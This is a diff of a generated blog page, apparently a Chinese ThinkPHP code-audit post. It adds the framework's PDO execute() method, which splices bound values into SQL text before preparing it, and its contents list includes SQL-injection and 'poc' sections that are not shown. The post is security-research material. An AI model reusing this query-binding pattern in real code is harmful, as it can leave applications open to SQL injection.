+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">public function execute($str,$fetchSql=false) &#123;</span><br><span class="line">        $this-&gt;initConnect(true);</span><br><span class="line">        if ( !$this-&gt;_linkID ) return false;</span><br><span class="line">        $this-&gt;queryStr = $str;</span><br><span class="line">        if(!empty($this-&gt;bind))&#123;</span><br><span class="line">            $that   =   $this;</span><br><span class="line">            $this-&gt;queryStr =   strtr($this-&gt;queryStr,array_map(function($val) use($that)&#123; return &apos;\&apos;&apos;.$that-&gt;escapeString($val).&apos;\&apos;&apos;; &#125;,$this-&gt;bind));</span><br><span class="line">        &#125;</span><br><span class="line">        if($fetchSql)&#123;</span><br><span class="line">            return $this-&gt;queryStr;</span><br><span class="line">        &#125;</span><br><span class="line">        //释放前次的查询结果</span><br><span class="line">        if ( !empty($this-&gt;PDOStatement) ) $this-&gt;free();</span><br><span class="line">        $this-&gt;executeTimes++;</span><br><span class="line">        N(&apos;db_write&apos;,1); // 兼容代码</span><br><span class="line">        // 记录开始执行时间</span><br><span class="line">        $this-&gt;debug(true);</span><br><span class="line">        $this-&gt;PDOStatement =   $this-&gt;_linkID-&gt;prepare($str);</span><br><span class="line">        if(false === $this-&gt;PDOStatement) &#123;</span><br><span class="line">            $this-&gt;error();</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        foreach ($this-&gt;bind as $key =&gt; $val) &#123;</span><br><span class="line">            if(is_array($val))&#123;</span><br><span class="line">                $this-&gt;PDOStatement-&gt;bindValue($key, $val[0], $val[1]);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $this-&gt;PDOStatement-&gt;bindValue($key, $val);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;bind =   array();</span><br><span class="line">        try&#123;</span><br><span class="line">            $result =   $this-&gt;PDOStatement-&gt;execute();</span><br><span class="line">            // 调试结束</span><br><span class="line">            $this-&gt;debug(false);</span><br><span class="line">            if ( false === $result) &#123;</span><br><span class="line">                $this-&gt;error();</span><br><span class="line">                return false;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $this-&gt;numRows = $this-&gt;PDOStatement-&gt;rowCount();</span><br><span class="line">                if(preg_match(&quot;/^\s*(INSERT\s+INTO|REPLACE\s+INTO)\s+/i&quot;, $str)) &#123;</span><br><span class="line">                    $this-&gt;lastInsID = $this-&gt;_linkID-&gt;lastInsertId();</span><br><span class="line">                &#125;</span><br><span class="line">                return $this-&gt;numRows;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;catch (\PDOException $e) &#123;</span><br><span class="line">            $this-&gt;error();</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 
 
 
 
-</code></pre>
+
+
+
+
+
       
 
       
@@ -387,7 +397,7 @@ W($name, $data=array(), $return=false,$path='')
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/04/29/一次晕乎乎的tp审计/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/05/16/一次晕乎乎的tp审计/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -401,18 +411,18 @@ W($name, $data=array(), $return=false,$path='')
   
 <nav id="article-nav">
   
-    <a href="/2020/05/01/VScode-phpstudy-Xdebug调试配置/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2020/05/17/记第一次出题/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          VScode+phpstudy+Xdebug调试配置
+          记第一次出题
         
       </div>
     </a>
   
   
-    <a href="/2020/04/22/2019-easy-serialize-php/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">2019]easy_serialize_php&#39;</div>
+    <a href="/2020/05/14/assert-eval/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">assert&amp;eval</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -439,7 +449,7 @@ W($name, $data=array(), $return=false,$path='')
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MVC"><span class="toc-number">1.</span> <span class="toc-text">MVC</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#m-c-a"><span class="toc-number">2.</span> <span class="toc-text">m\c\a</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#跨控制器调用方式-A方法-R方法"><span class="toc-number">3.</span> <span class="toc-text">跨控制器调用方式 A方法 R方法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#单字母大写函数"><span class="toc-number">4.</span> <span class="toc-text">单字母大写函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#调试"><span class="toc-number">5.</span> <span class="toc-text">调试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#连接数据库"><span class="toc-number">6.</span> <span class="toc-text">连接数据库</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#更新数据"><span class="toc-number">7.</span> <span class="toc-text">更新数据</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#控制器加入方法："><span class="toc-number">7.1.</span> <span class="toc-text">控制器加入方法：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入"><span class="toc-number">7.2.</span> <span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc"><span class="toc-number">7.2.1.</span> <span class="toc-text">poc</span></a></li></ol></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MVC"><span class="toc-number">1.</span> <span class="toc-text">MVC</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#m-c-a"><span class="toc-number">2.</span> <span class="toc-text">m\c\a</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#跨控制器调用方式-A方法-R方法"><span class="toc-number">3.</span> <span class="toc-text">跨控制器调用方式 A方法 R方法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#单字母大写函数"><span class="toc-number">4.</span> <span class="toc-text">单字母大写函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#调试"><span class="toc-number">5.</span> <span class="toc-text">调试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#连接数据库"><span class="toc-number">6.</span> <span class="toc-text">连接数据库</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#更新数据"><span class="toc-number">7.</span> <span class="toc-text">更新数据</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#控制器加入方法："><span class="toc-number">7.1.</span> <span class="toc-text">控制器加入方法：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入"><span class="toc-number">7.2.</span> <span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc"><span class="toc-number">7.2.1.</span> <span class="toc-text">poc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过程："><span class="toc-number">7.3.</span> <span class="toc-text">过程：</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -571,6 +581,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">sqli</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">VS code</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">yilia</a>
               </li>
              
@@ -583,7 +601,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">VS code</a>
+                <a href="javascript:void(0)" class="js-tag color4">php</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -592,10 +610,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">seed爆破</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">php</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -619,10 +633,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">sqli</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">phar</a>
               </li>
              
@@ -631,15 +641,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">kali配置</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">乱七八糟</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
               </li>
              
               <li class="article-tag-list-item">
